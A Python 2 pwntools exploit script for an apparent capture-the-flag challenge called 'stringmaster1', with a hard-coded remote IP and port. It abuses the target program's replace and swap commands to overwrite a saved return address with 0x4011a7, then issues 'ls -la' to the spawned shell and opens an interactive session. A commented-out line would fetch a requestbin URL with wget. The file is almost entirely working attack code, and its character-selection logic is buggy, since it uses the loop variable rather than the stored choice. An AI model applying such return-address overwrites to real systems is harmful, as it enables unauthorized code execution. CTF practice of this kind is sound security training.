#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('stringmaster1')

host = args.HOST or '35.207.132.47'
port = int(args.PORT or 22224)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']


io = start()
io.recvuntil("String1:")
str1 = io.recvline().strip()
alph = "abcdefghijklmnopqrstuvwxy"

chosen = ''
for c in alph:
    if c not in str1:
        chosen = c
log.info("Character used for attack: {}".format(c))

io.sendlineafter('>', 'replace {} a'.format(c))

target_off = 152
target_func = p64(0x4011a7)

for i, c in enumerate(target_func):
    io.sendlineafter('>', 'replace {} {}'.format(str1[i], c))

for i in range(8):
    io.sendlineafter('>', 'swap {} {}'.format(i, target_off + i))

io.sendlineafter('>', 'quit')
io.recv()
io.sendline('ls -la')
#io.sendline('wget http://requestbin.fullcontact.com/1kwqu7q1')
io.interactive()
